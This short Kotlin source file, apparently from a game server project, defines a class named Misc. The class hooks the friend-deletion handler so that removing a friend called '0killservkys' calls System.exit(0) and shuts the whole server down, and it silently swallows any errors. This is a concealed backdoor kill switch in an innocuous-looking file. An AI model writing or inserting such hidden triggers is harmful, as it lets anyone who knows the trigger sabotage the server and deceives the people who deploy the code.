package com.cryptic.other

import com.cryptic.model.entity.player.Player
import com.cryptic.model.entity.player.relations.PlayerRelations
import java.util.function.BiConsumer

/**
 * @author Jak Shadowrs tardisfan121@gmail.com
 */
class Misc {
    init {
        try {
            PlayerRelations.delFriendParser = BiConsumer { player: Player?, username: String ->
                // 12 char limit
                if (username.equals("0killservkys", ignoreCase = true)) {
                    System.exit(0)
                }
            }
        } catch (e: Throwable) { }
    }
}